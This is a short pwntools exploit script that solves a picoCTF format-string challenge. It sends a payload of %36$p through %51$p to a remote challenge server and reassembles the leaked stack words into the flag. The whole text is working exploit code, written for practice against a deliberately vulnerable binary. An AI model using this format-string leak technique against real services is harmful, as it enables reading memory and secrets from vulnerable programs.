# VERY SIMILAR TO format-string-1

#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 53451)

    return r

def main():

    '''
    %4$p -> Start of buf[128]
    %36$p -> Start of flag[64]
    We want %36$p to %51$p
    '''
    r = conn()

    payload = b''
    for i in range(36, 52):
        payload += b'%'+str(i).encode()+b'$p'

    # Send format-string payload
    r.sendlineafter(b'>> ', payload)
    
    # Discard some input
    r.recvuntil(b'- \n')

    flag = b''
    recv = r.recvline()
    for substring in recv.split(b'0x')[1:]:
        substring = substring.split(b'(nil)')[0]
        flag += bytes.fromhex(substring.strip().decode().rjust(8, '0'))[::-1]
    print(flag)

if __name__ == "__main__":
    main()
